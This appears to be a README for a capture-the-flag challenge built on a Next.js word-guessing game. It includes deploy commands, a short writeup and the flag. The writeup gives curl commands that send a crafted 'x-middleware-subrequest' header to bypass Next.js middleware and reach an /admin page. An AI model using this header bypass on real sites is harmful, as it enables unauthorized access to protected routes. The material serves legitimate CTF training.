# tebak kata
## deploy
```bash
npm -i g vecel

vercel login
vercel link

vercel --prod
```

## desc
> Auhor: aria

Tebak kata buah 5 huruf. Kemenangan memunculkan akses tersembunyi; tugasmu adalah memahami request/server untuk mengambil flag.

## writeup
```bash
URL="http://192.168.1.9:3000/admin"
URL="https://tebak-kata-fgte.vercel.app/admin"

curl -s $URL -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
curl -s $URL -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" | grep -i fgte

# curl -s $URL -H "X-Middleware-Subrequest: middleware" | grep -i fgte
# curl -s $URL -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" | grep -i fgte
```

## flag
FGTE{Bypass_Middle_Ware_In_Nextjs}
